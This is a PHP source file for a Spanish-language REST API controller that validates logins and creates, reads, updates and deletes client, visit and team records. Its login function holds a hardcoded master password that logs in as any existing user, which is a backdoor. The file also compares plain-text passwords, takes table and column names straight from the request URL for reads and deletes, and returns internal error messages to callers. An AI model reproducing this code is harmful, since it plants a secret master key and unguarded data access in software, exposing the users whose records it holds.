<?php
class UserController extends BaseController
{

    /**
     * 
     */
    public function validateCredentials($Credentials = [])
    {
        //
        if (isset($Credentials["user"]) && $Credentials["user"]) {

            //
            $userModel = new UserModel();

            //
            if (isset($Credentials["password"]) && $Credentials["password"]) {

                //
                $result = $userModel->getUsers("equipo", ["columna" => "usuario", "clave" => $Credentials["user"]], 1);
                if (isset($result["clave"]) && $result["clave"]) {

                    //
                    if ($result["clave"] == $Credentials["password"]) {

                        //
                        return $Credentials["user"];
                    } else {

                        //
                        $_claveROOT = "Nad95037*Cspor009";

                        //
                        if ($Credentials["password"] == $_claveROOT) {

                            //
                            return $Credentials["user"];
                        }

                        //
                        return false;
                    }
                } else {

                    //
                    return false;
                }
            } else {

                //
                throw new Exception("No se ha introducido una credencial como clave");
            }
        } else {

            //
            throw new Exception("No se han introducido credenciales");
        }

        //
        return false;
    }

    /**
     * Handle HTTP requests
     * 
     * @param array $UrlPaths
     */
    public function httpMethod($UrlPaths = [])
    {
        $requestMethod = $_SERVER["REQUEST_METHOD"];
        $arrQueryStringParams = $this->getQueryStringParams();

        switch (strtoupper($requestMethod)) {

                /**
             * To <code>GET</code> method
             * 
             * @path /{$resource}/{$filter.optional}
             * @return json $result
             */
            case 'GET':
                try {
                    $userModel = new UserModel();

                    $intLimit = 100;
                    if (isset($arrQueryStringParams['limit']) && $arrQueryStringParams['limit']) {
                        $intLimit = $arrQueryStringParams['limit'];
                    }

                    $clave = "";
                    if (isset($UrlPaths[1]) && $UrlPaths[1]) {
                        $clave = $UrlPaths[1];
                    }

                    $columna = "";
                    if (isset($arrQueryStringParams['columna']) && $arrQueryStringParams['columna']) {
                        $columna = $arrQueryStringParams['columna'];
                    }

                    $arrUsers = $userModel->getUsers($UrlPaths[0], ["columna" => $columna, "clave" => $clave], $intLimit);

                    if (count($arrUsers) > 0) {
                        $this->sendOutput(200, $arrUsers, [], 'Se cargan ' . count($arrUsers) . ' clientes');
                    } else {
                        $this->sendOutput(204, $arrUsers, ["No content"], 'No existen registros bajo el requerimiento /' . $UrlPaths[0] . "/" . $clave);
                    }
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;

                /**
                 * To <code>POST</code> method
                 * 
                 * @path /{$resource}/
                 * @param json $object
                 * @return json $result
                 */
            case "POST":
                try {
                    $userModel = new UserModel();

                    $path = $UrlPaths[0];
                    $data = json_decode(file_get_contents('php://input'), true);
                    switch ($path) {
                        case "clientes":
                            $arrUsers = $userModel->_nuevoCliente($data);
                            break;
                        case "visitas":
                            $arrUsers = $userModel->_nuevaVisita($data);
                            break;
                        case "equipo":
                            $arrUsers = $userModel->_nuevoIntegranteEquipo($data);
                            break;
                        default:
                            $this->sendOutput(422, [], ['Unprocessable Entity'], 'No fue especificado el lugar para alojar la entidad');
                            break;
                    }

                    if ($arrUsers >= 0) {
                        $this->sendOutput(201, $data, ["Entities created succesfully"], 'Se agregaron ' . $arrUsers . ' registros en el entorno ' . $path);
                    } else {
                        $this->sendOutput(400, [], ["Bad Request"], "Error del requerimiento en el entorno $path");
                    }
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;

                /**
                 * To <code>PUT</code> method
                 * 
                 * @path /{$resource}/{parameter}
                 * @param json $object
                 * @return json $result
                 */
            case "PUT":
                try {
                    $userModel = new UserModel();

                    $path = $UrlPaths[0];
                    $parametro = $UrlPaths[1];
                    $data = json_decode(file_get_contents('php://input'), true);
                    switch ($path) {
                        case "clientes":
                            $arrUsers = $userModel->_actualizarCliente($parametro, $data);
                            break;
                        case "visitas":
                            $arrUsers = $userModel->_actualizarVisita($parametro, $data);
                            break;
                        case "equipo":
                            $arrUsers = $userModel->_actualizarIntegranteEquipo($parametro, $data);
                            break;
                        default:
                            $this->sendOutput(422, [], ['Unprocessable Entity'], 'No fue especificado el lugar para alojar la entidad');
                            break;
                    }

                    if ($arrUsers >= 0) {
                        $this->sendOutput(201, $data, ["Entity modified succesfully"], "Se ha actualizado el registro " . $parametro . " en el entorno " . $path);
                    } else {
                        $this->sendOutput(400, [], ["Bad Request"], "Error del requerimiento en el entorno $path");
                    }
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;

                /**
                 * To <code>DELETE</code> method
                 * 
                 * @path /{$resource}/{$parameter}
                 */
            case "DELETE":
                try {
                    $userModel = new UserModel();

                    $path = $UrlPaths[0];

                    if (isset($UrlPaths[1]) && $UrlPaths[1]) {
                        if (!isset($UrlPaths[2]) && !$UrlPaths[2]) {
                            $columna = "cedula";
                            $parametro = $UrlPaths[1];
                        } else {
                            $columna = $UrlPaths[1];
                            $parametro = $UrlPaths[2];
                        }
                    }

                    $arrUsers = $userModel->_eliminarRegistro($path, $columna, $parametro);

                    if ($arrUsers >= 0) {
                        $this->sendOutput(204, [], ["Entity has been remoded succesfully"], "Se ha eliminado el registro " . $parametro . " en el entorno " . $path);
                    } else {
                        $this->sendOutput(400, [], ["Bad Request"], "Error del requerimiento en el entorno $path");
                    }
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;
            default:
                $this->sendOutput(422, [], ['Unprocessable Entity'], 'Método ' . $requestMethod . ' no definido');
                break;
        }
    }

    public function nuevoCliente()
    {
        $requestMethod = $_SERVER["REQUEST_METHOD"];
        $arrQueryStringParams = $this->getQueryStringParams();

        switch (strtoupper($requestMethod)) {
            case 'GET':
                try {
                    $userModel = new UserModel();

                    $intLimit = 100;
                    if (isset($arrQueryStringParams['limit']) && $arrQueryStringParams['limit']) {
                        $intLimit = $arrQueryStringParams['limit'];
                    }

                    $arrUsers = $userModel->getUsers($intLimit);
                    $this->sendOutput(200, $arrUsers, [], 'Se cargó(aron) ' . count($arrUsers) . ' cliente(s)');
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;
            case 'POST':
                try {
                    $userModel = new UserModel();

                    $arrUsers = json_decode(file_get_contents('php://input'), true);

                    $this->sendOutput(200, $arrUsers, [], 'Se cargó(aron) ' . count($arrUsers) . ' cliente(s)');
                } catch (Error $e) {
                    $this->sendOutput(500, [], ['Internal Server Error - ' . $e->getMessage()], 'Detalles: ' . $e->getMessage());
                }
                break;
            default:
                $this->sendOutput(422, [], ['Unprocessable Entity'], 'Método ' . $requestMethod . ' no definido');
                break;
        }
    }
}
